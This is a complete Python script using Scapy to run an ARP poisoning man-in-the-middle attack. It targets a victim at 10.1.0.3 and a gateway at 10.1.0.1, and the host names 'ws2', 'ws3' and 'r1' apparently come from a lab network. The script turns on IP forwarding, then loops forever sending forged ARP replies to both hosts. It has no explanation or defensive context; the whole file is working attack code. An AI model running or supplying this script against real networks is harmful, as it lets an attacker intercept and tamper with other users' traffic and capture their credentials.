#!/usr/bin/env python3
from scapy.all import ARP, send, getmacbyip
import time
import os

victim_ip = "10.1.0.3"    # ws3
gateway_ip = "10.1.0.1"   # r1

print("[+] ARP poisoning attack")
print("[+] Attacker : ws2")
print("[+] Victim   :", victim_ip)
print("[+] Gateway  :", gateway_ip)

os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")

victim_mac = getmacbyip(victim_ip)
gateway_mac = getmacbyip(gateway_ip)

if victim_mac is None:
    print("[-] Cannot find apvictim MAC")
    exit(1)

if gateway_mac is None:
    print("[-] Cannot find gateway MAC")
    exit(1)

print("[+] Victim MAC  :", victim_mac)
print("[+] Gateway MAC :", gateway_mac)
print("[+] Poisoning started... CTRL+C to stop sending packets")

while True:
    packet_to_victim = ARP(
        op=2,
        pdst=victim_ip,
        hwdst=victim_mac,
        psrc=gateway_ip
    )

    packet_to_gateway = ARP(
        op=2,
        pdst=gateway_ip,
        hwdst=gateway_mac,
        psrc=victim_ip
    )

    send(packet_to_victim, verbose=False)
    send(packet_to_gateway, verbose=False)

    print("[+] ARP poison packets sent")
    time.sleep(2)